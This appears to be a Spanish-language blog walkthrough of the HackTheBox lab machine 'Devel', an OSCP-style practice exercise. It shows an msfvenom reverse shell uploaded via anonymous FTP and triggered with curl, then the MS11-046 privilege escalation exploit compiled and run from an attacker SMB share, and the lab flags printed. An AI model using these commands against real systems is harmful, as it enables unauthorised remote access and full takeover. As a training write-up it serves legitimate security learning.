---
layout: post
title: Devel - Walkthrough
date: 2020-08-14 20:44
description: Devel se presenta con un giro de tuerca para el compromiso inicial y escalamiento de privilegios basado en CVE.
toc: true
comments: false
tags: 
 - OSCP
 - Walkthrough
 - HackTheBox

---

## **Walkthrough de Devel**
---

![img]({{ '/assets/images/Devel/Devel_00.png' | relative_url }}){: .center-image }*(Descripción)*

---
Devel se presenta con un giro de tuerca para el compromiso inicial y escalamiento de privilegios basado en CVE.

---

## **Links**
 Devel en Hack The Box](https://www.hackthebox.eu/home/machines/profile/3)



## **Reconocimiento**
---

>**``nmap -A -T4 -p 21,80 10.10.10.5 -oA Devel``**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 18:34 -03
Nmap scan report for 10.10.10.5
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|8.1|Vista|7|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional or Windows 8 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)

HOP RTT       ADDRESS
1   255.37 ms 10.10.14.1
2   255.51 ms 10.10.10.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.60 seconds
```

Solo dos puertos abiertos con los servicios de FTP y HTTP. No tiene mucho sentido correr `Nikto` y `Dirb` sobre el servidor web. En principio es un IIS por defecto.

El servidor FTP es accesible con el usuario **Anonymous** y sin password como `nmap` lo demuestra. Existen dos malas configuraciones que hacen la vida más fácil al atacante:

 * Es posible subir archivos al servidor FTP autenticado como anonimo.
 * Casualmente el directorio home o root del FTP y HTTP es el mismo.

 Esto significa que se podría subir una shell reversa por FTP y dispararla al accederla a trevés de HTTP.


## **FTP**
---

Primero va una shell reversa con salida en un archivo `aspx`:

> **`` msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f aspx -o shell.aspx``**

y se sube por FTP:

```console
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2817 bytes sent in 0.00 secs (33.5813 MB/s)
ftp> quit
221 Goodbye.
```

De paso, por si todo sale bien también le subi `winPEAS` para ver la forma de escalar prvilegios:

```console
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put winPEAS.bat
local: winPEAS.bat remote: winPEAS.bat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
33480 bytes sent in 0.00 secs (40.7258 MB/s)
ftp> quit
221 Goodbye.
```

Ahora lo de siempre, en una terminal se abre un `nc` y en otra se accede al archivo para disparar la shell reversa:

> ``nc -lnvp 4444``

> ``curl http://10.10.10.5/shell.aspx``

yyyyyy entramos!

```console
c:\windows\system32\inetsrv>\
```
---

El usuario con el que logramos entrar es el de IIS así que no tiene muchos privilegios, ni siquiera para agarrar la flag del usuario.


``winPEAS`` no demostró mucha utiliadd en este caso más allá del comando ``systeminfo`` que reveló un **Windows 7 build 5600** sin parches.


## **Exploit**
---
Acá se complicó un poco encontrar la vulnerabilidad que permitiera escalar privilegios, es la sigueinte: **MS11-046**.

Para buscarla en `searchsploit`:

```console
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                           | windows_x86/local/40564.c
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Una vez copiado el exploit se ve que es un código fuente en lenguaje C que necesita ser compilado. Para eso, hace falta instalar `mingw` en Kali de la siguiente manera:

> ``apt-get install mingw-w64``

y después para compilar el exploit:

> ``i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32``

No debería haber problemas con eso. Ahora, la copia del archivo a la máquina atacante es fácil pero la ejecución no lo fue. De casi cualquier forma que se trate de correr el ejecutable siempre va a tirar la advertencia ``This program cannot run un DOS mode``.

Una muy buena alternativa fue ejecutar el exploit desde un path UNC. Para eso, hace falta levantar un servidor SMB en Kali:

> `` cp /usr/share/doc/python-impacket/examples/smbserver.py .``

> ``./smbserver.py share smb``

donde `share` es como se va a llamar el recurso compartido y `smb` es el nombre del directorio local que se va a compartir. Obviamente, hay que copiar el el exploit a la carpeta `smb`.

A ejecutar:

```console
c:\windows\system32\inetsrv>\\10.10.14.23\share\MS11-046.exe
\\10.10.14.23\share\MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>
```

Listo, sosmos `System`, a buscar las flags:

## **Flags**
---

```console
c:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8

c:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
e621a0b5041708797c4fc4728bc72b4b
```

---